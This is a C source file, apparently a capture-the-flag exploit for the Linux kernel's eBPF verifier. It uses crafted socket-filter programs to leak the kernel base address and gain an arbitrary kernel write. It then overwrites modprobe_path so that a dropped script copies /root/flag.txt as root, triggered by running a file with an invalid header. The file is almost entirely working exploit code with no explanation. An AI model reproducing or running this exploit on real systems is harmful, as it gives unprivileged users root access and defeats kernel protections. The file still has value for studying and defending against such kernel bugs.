#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include "bpf_insn.h"

unsigned long kernel_base = 0;
unsigned long addr_heap = 0;

unsigned long off_target   = 0xffffffffb298babf - 0xffffffffb2400000;
unsigned long off_modprobe = 0xffffffffbd238340 - 0xffffffffbc400000;

void fatal(const char *msg) 
{
	perror(msg);
	exit(1);
}

int bpf(int cmd, union bpf_attr *attrs) 
{
	return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int map_create(int val_size, int max_entries)
{
	union bpf_attr attr = {
		.map_type = BPF_MAP_TYPE_ARRAY,
		.key_size = sizeof(int),
		.value_size = val_size,
		.max_entries = max_entries
	};
	int mapfd = bpf(BPF_MAP_CREATE, &attr);
	if(mapfd < 0) fatal("bpf(BPF_MAP_CREATE)");
	return mapfd;
}

int map_update(int mapfd, int key, void* pval) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (uint64_t)&key,
		.value = (uint64_t)pval,
		.flags = BPF_ANY
	};

	int res = bpf(BPF_MAP_UPDATE_ELEM, &attr);
	if(res < 0) fatal("bpf(BPF_MAP_UPDATE_ELEM)");
	return res;
}

int map_lookup(int mapfd, int key, void *pval)
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (uint64_t)&key,
		.value = (uint64_t)pval,
		.flags = BPF_ANY
	};

	return bpf(BPF_MAP_LOOKUP_ELEM, &attr);
}

unsigned long leak_address(int mapfd) {
	char verifier_log[0x10000];
	unsigned long val;

	struct bpf_insn insns[] = {
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_ARG1),
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x8, 0), // fp_x8 key=0
		BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &key)
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),
		
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),
		
		BPF_MOV64_IMM(BPF_REG_4, -1),

		// r8 = 0 / real 1
		BPF_ALU32_REG(BPF_LSH, BPF_REG_8, BPF_REG_4),
		BPF_ALU64_IMM(BPF_RSH, BPF_REG_8, 31),
		
		// r8 = 1 / real 0x10
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x9-1),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1),

		BPF_MOV64_IMM(BPF_REG_3, 1),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -0x28),
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x28),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -0x18),
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),			
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x20),		// arg4 = fp-0x20

		BPF_MOV64_IMM(BPF_REG_ARG2, 0),
		BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_8),
		BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_7),
		BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

		BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_FP, -0x18),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),
	
		// map_update_elem	
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x8, 0), 			// [fp-0x8]=0(key)
		
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_8, -0x10),	// [fp-0x10]=r2
		BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),					// arg1 = mapfd
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x8),			// arg2 = fp-0x8
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),		// arg3 = fp=010
		BPF_MOV64_IMM(BPF_REG_ARG4, 0),
		BPF_EMIT_CALL(BPF_FUNC_map_update_elem),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	union bpf_attr prog_attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = sizeof(insns) / sizeof(insns[0]),
		.insns = (uint64_t) insns,
		.license = (uint64_t)"GPL v2",
		.log_level = 2,
		.log_size = sizeof(verifier_log),
		.log_buf = (uint64_t)verifier_log,
	};

	int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
	if (progfd == -1) {
		printf("%s\n", verifier_log);
		fatal("bpf(BPF_PROG_LOAD)");
	}
	printf("%s\n", verifier_log);

	int socks[2];
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
		fatal("socketpair");
	if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
		fatal("setsockopt");
	

	int i;
	char payload[0x10];
	*(unsigned long*)&payload[0] = 0x4141414141414141;
	for(i = 0; i < 0x100; i+=8) {
		val = 1;	
		map_update(mapfd, 0, &val);
		payload[0x8] = i;
		write(socks[1], payload, 0x9);
		map_lookup(mapfd, 0, &val);
	
		printf("0x%03lx: %016llx\n", i, val);
		if(i == 0xb8)
			kernel_base = val - off_target;	
	}
	printf("kbase = %016llx\n", kernel_base);
	return val;
}

void aaw64(int mapfd, unsigned long addr, unsigned long data) {
	char verifier_log[0x10000];
	unsigned long val;

	struct bpf_insn insns[] = {
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_ARG1),
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x8, 0), // fp_x8 key=0
		BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &key)
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),
		
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),			// r9 = mapaddr
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0), 	// r8 = &map[0]
		
		BPF_MOV64_IMM(BPF_REG_4, -1),

		// r8 = 0 / real 1
		BPF_ALU32_REG(BPF_LSH, BPF_REG_8, BPF_REG_4),
		BPF_ALU64_IMM(BPF_RSH, BPF_REG_8, 31),
		
		// r8 = 1 / real 0x10
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x10-1),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1),

		
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x18),		// [fp-0x18] = mapaddr
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),			
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x20),		// arg3 = fp-0x20

		BPF_MOV64_IMM(BPF_REG_ARG2, 0),						// arg2 = 0
		BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_8),				// arg4 = len(1/0x10)
		BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_7),				// arg1 = skb
		BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

		BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_FP, -0x18),	// r9 = [fp-0x18]
	
		BPF_MOV64_IMM(BPF_REG_1, data >> 32),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, data & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, 0), 			// [fp-0x28] = data

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	union bpf_attr prog_attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = sizeof(insns) / sizeof(insns[0]),
		.insns = (uint64_t) insns,
		.license = (uint64_t)"GPL v2",
		.log_level = 2,
		.log_size = sizeof(verifier_log),
		.log_buf = (uint64_t)verifier_log,
	};

	int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
	if (progfd == -1) {
		printf("%s\n", verifier_log);
		fatal("bpf(BPF_PROG_LOAD)");
	}
	printf("%s\n", verifier_log);

	int socks[2];
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
		fatal("socketpair");
	if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
		fatal("setsockopt");

	int i;
	char payload[0x10];
	*(unsigned long*)&payload[0] = 0x4141414141414141;
	*(unsigned long*)&payload[8] = addr;
	val = 1;	
	map_update(mapfd, 0, &val);
	write(socks[1], payload, 0x10);
	map_lookup(mapfd, 0, &val);
	printf("target = 0x%016llx\n", addr);
	//read(socks[0], payload, 0x10);
}


int main()
{
	int mapfd = map_create(0x8, 2);
	int socks[2];
	unsigned long d = 0x6d6b2f706d742f; // /tmp/km	
	leak_address(mapfd);
	aaw64(mapfd, kernel_base+off_modprobe, d);
	
	// after overwrite modprobe_path
	system("touch /tmp/flag");
	system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/invalid");
	system("chmod u+x /tmp/invalid");
	system("echo '#!/bin/sh\n cat /root/flag.txt > /tmp/flag' > /tmp/km ");
	system("chmod u+x /tmp/km");
	system("/tmp/invalid");

	return 0;
}
